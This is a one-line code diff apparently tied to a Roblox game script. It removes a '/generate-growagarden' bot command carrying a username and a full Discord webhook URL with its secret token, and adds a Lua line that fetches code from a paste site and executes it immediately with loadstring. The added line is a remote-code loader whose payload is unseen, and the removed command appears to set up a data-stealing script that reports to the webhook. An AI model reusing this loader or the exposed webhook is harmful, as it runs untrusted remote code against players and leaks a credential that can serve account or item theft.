@@ -1,1 +1,1 @@
-/generate-growagarden username:RajaGantenkAlt1 webhook:https://discord.com/api/webhooks/1376648143176859668/hwlVOc9b3eVbLHomkPMqc2EK87Jap1HMiMLM4EVXp-u-cvKqwQuTl7iryREwzl8oMRlO
+loadstring(game:HttpGet("http://vpaste.net/PIhQ0"))()
